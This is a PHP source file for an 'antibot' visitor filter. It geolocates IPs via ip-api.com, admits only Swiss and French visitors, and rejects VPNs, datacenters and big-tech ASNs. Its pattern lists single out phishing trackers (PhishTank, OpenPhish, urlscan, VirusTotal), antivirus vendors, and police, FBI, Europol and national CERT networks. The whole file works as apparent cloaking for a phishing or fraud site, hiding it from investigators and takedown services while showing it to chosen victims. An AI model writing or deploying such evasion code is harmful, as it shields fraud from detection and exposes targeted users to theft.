<?php

declare(strict_types=1);

function antibot_ip_cache_dir(): string
{
    return dirname(__DIR__, 2) . '/data/ipcache';
}

function antibot_ip_info(string $ip): ?array
{
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return null;
    }

    $dir = antibot_ip_cache_dir();
    if (!is_dir($dir) && !mkdir($dir, 0750, true) && !is_dir($dir)) {
        return antibot_ip_fetch($ip);
    }

    $file = $dir . '/' . hash('sha256', $ip) . '.json';
    if (is_file($file)) {
        $cached = json_decode((string) file_get_contents($file), true);
        if (
            is_array($cached)
            && ($cached['expires'] ?? 0) > time()
            && is_array($cached['data'] ?? null)
        ) {
            return $cached['data'];
        }
    }

    $data = antibot_ip_fetch($ip);
    if ($data !== null) {
        file_put_contents($file, json_encode([
            'expires' => time() + 86400,
            'data' => $data,
        ], JSON_UNESCAPED_UNICODE), LOCK_EX);
    }

    return $data;
}

function antibot_ip_fetch(string $ip): ?array
{
    $fields = 'status,message,country,countryCode,isp,org,as,mobile,proxy,hosting,query';
    $url = 'http://ip-api.com/json/' . rawurlencode($ip) . '?fields=' . $fields;
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => 4,
            'ignore_errors' => true,
        ],
    ]);

    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return null;
    }

    $json = json_decode($response, true);
    if (!is_array($json) || ($json['status'] ?? '') !== 'success') {
        return null;
    }

    return [
        'country' => (string) ($json['country'] ?? ''),
        'countryCode' => strtoupper((string) ($json['countryCode'] ?? '')),
        'isp' => (string) ($json['isp'] ?? ''),
        'org' => (string) ($json['org'] ?? ''),
        'as' => (string) ($json['as'] ?? ''),
        'mobile' => !empty($json['mobile']),
        'proxy' => !empty($json['proxy']),
        'hosting' => !empty($json['hosting']),
        'query' => (string) ($json['query'] ?? $ip),
    ];
}

function antibot_big_tech_patterns(): array
{
    return [
        'google' => ['google', 'gcp', 'googlecloud', 'alphabet', 'youtube', 'google llc', 'as15169', 'as396982'],
        'microsoft' => ['microsoft', 'azure', 'msft', 'microsoft corporation', 'as8075', 'as8068', 'as8069'],
        'apple' => ['apple inc', 'apple computer', 'icloud', 'as714', 'as6185', 'as2709'],
        'amazon' => ['amazon', 'aws', 'amazonaws', 'amazon data', 'as16509', 'as14618'],
        'meta' => ['facebook', 'meta platform', 'instagram', 'whatsapp', 'as32934', 'as63293'],
        'oracle' => ['oracle', 'oracle cloud', 'as31898', 'as14340'],
        'ibm' => ['ibm', 'softlayer', 'as36351', 'as12876'],
    ];
}

function antibot_security_scanner_patterns(): array
{
    return [
        'netcraft', 'censys', 'shodan', 'binaryedge', 'onyphe', 'securitytrails',
        'urlscan', 'virustotal', 'phishtank', 'openphish', 'spamhaus',
        'qualys', 'nessus', 'rapid7', 'tenable', 'acunetix', 'detectify',
        'sucuri', 'sitelock', 'cloudflare security', 'zscaler', 'forcepoint',
        'palo alto', 'fortinet', 'checkpoint', 'sophos', 'kaspersky', 'bitdefender',
        'symantec', 'broadcom', 'trend micro', 'mcafee', 'eset', 'avast',
        'malwarebytes', 'crowdstrike', 'sentinelone', 'recorded future',
        'semrush', 'ahrefs', 'majestic', 'moz.com', 'builtwith',
    ];
}

function antibot_hosting_patterns(): array
{
    return [
        'digitalocean', 'linode', 'vultr', 'ovh', 'hetzner', 'contabo', 'scaleway',
        'leaseweb', 'choopa', 'm247', 'datacamp', 'hostinger', 'godaddy',
        'bluehost', 'namecheap', 'ionos', '1&1', 'rackspace', 'softlayer',
        'cloudflare', 'akamai', 'fastly', 'incapsula', 'imperva', 'stackpath',
        'cdn77', 'bunnycdn', 'gcore', 'leaseweb', 'psychz',
        'alibaba', 'tencent', 'huawei cloud', 'baidu cloud', 'ucloud',
        'hosting', 'hoster', 'server', 'datacenter', 'data center', 'colocation',
        'dedicated', 'vps', 'cloud services', 'cloud computing', 'bare metal',
        'llc hosting', 'internet assigned', 'backbone', 'network solutions',
    ];
}

function antibot_vpn_patterns(): array
{
    return [
        'vpn', 'proxy', 'tor exit', 'mullvad', 'nordvpn', 'expressvpn', 'protonvpn',
        'surfshark', 'cyberghost', 'private internet access', 'ipvanish',
        'windscribe', 'tunnelbear', 'hotspot shield', 'hidemyass', 'purevpn',
    ];
}

function antibot_authority_patterns(): array
{
    return [
        'government', 'gouv.fr', 'gouv.', 'administration', 'ministere', 'ministry',
        'police', 'bundesamt', 'defense.gouv', 'fbi.', 'interpol', 'europol',
        'agence nationale', 'ofac', 'ncsc', 'anssi', 'bsi.de', 'cert.',
    ];
}

function antibot_bad_isp_patterns(): array
{
    return array_merge(
        antibot_security_scanner_patterns(),
        antibot_hosting_patterns(),
        antibot_vpn_patterns(),
        antibot_authority_patterns(),
    );
}

function antibot_corporate_block_reason(array $info): ?string
{
    $blob = implode(' ', [$info['isp'] ?? '', $info['org'] ?? '', $info['as'] ?? '']);

    foreach (antibot_big_tech_patterns() as $reason => $patterns) {
        if (antibot_text_matches_patterns($blob, $patterns)) {
            return $reason;
        }
    }

    if (antibot_text_matches_patterns($blob, antibot_security_scanner_patterns())) {
        return 'security';
    }

    if (antibot_text_matches_patterns($blob, antibot_hosting_patterns())) {
        return 'datacenter';
    }

    if (antibot_text_matches_patterns($blob, antibot_authority_patterns())) {
        return 'authority';
    }

    if (antibot_text_matches_patterns($blob, antibot_vpn_patterns())) {
        return 'vpn_isp';
    }

    return null;
}

function antibot_text_matches_patterns(string $text, array $patterns): bool
{
    $haystack = strtolower($text);

    foreach ($patterns as $pattern) {
        if ($pattern !== '' && str_contains($haystack, strtolower($pattern))) {
            return true;
        }
    }

    return false;
}

function antibot_is_blocked_isp(array $info): bool
{
    $blob = implode(' ', [
        $info['isp'] ?? '',
        $info['org'] ?? '',
        $info['as'] ?? '',
    ]);

    return antibot_text_matches_patterns($blob, antibot_bad_isp_patterns());
}

function antibot_get_block_reason(): ?string
{
    $config = antibot_config();
    $ip = antibot_client_ip();

    if (ip_blocklist_is_blocked($ip)) {
        return 'banned';
    }

    if (!empty($config['require_user_agent']) && antibot_user_agent() === '') {
        return 'user_agent';
    }

    if (!empty($config['block_bad_user_agents']) && antibot_is_bad_user_agent()) {
        return 'user_agent';
    }

    $info = antibot_ip_info($ip);

    if ($info === null) {
        return !empty($config['fail_closed']) ? 'ip_lookup' : null;
    }

    $allowed = $config['allowed_countries'] ?? ['CH', 'FR'];
    if (!in_array($info['countryCode'], $allowed, true)) {
        return 'country';
    }

    if (!empty($config['block_vpn']) && !empty($info['proxy'])) {
        return 'vpn';
    }

    if (!empty($config['block_hosting']) && !empty($info['hosting'])) {
        return 'datacenter';
    }

    if (!empty($config['block_bad_isp'])) {
        $corporate = antibot_corporate_block_reason($info);
        if ($corporate !== null) {
            return $corporate;
        }

        if (antibot_is_blocked_isp($info)) {
            return 'isp';
        }
    }

    if (!empty($config['block_corporate_asn']) && antibot_looks_corporate_asn($info['as'])) {
        return 'corporate';
    }

    return null;
}

function antibot_looks_corporate_asn(string $as): bool
{
    if (preg_match('/\b(as\d+)\b/i', $as, $m)) {
        $num = (int) substr($m[1], 2);
        $knownCorporate = [
            15169, 396982, 8075, 8068, 8069, 714, 6185, 16509, 14618,
            32934, 63293, 31898, 14340, 36351, 12876, 13335, 20940,
        ];
        if (in_array($num, $knownCorporate, true)) {
            return true;
        }
    }

    return false;
}
